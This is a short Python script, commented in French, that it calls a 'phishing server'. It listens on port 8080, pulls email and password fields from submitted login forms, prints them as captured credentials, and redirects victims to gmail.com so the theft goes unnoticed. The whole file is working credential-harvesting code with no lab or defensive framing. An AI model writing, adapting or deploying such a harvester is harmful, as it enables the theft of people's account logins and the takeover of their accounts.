from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse
import webbrowser

class RequestHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        email = urllib.parse.parse_qs(post_data).get('email', [''])[0]
        password = urllib.parse.parse_qs(post_data).get('password', [''])[0]
        
        print(f"\n[!] Identifiants capturés:")
        print(f"Email: {email}")
        print(f"Mot de passe: {password}\n")
        
        self.send_response(302)
        self.send_header('Location', 'https://gmail.com')
        self.end_headers()

def run_server():
    server_address = ('', 8080)  # Toutes interfaces, port 8080
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"Démarrage du serveur phishing sur http://localhost:8080")
    webbrowser.open('http://localhost:8080')
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()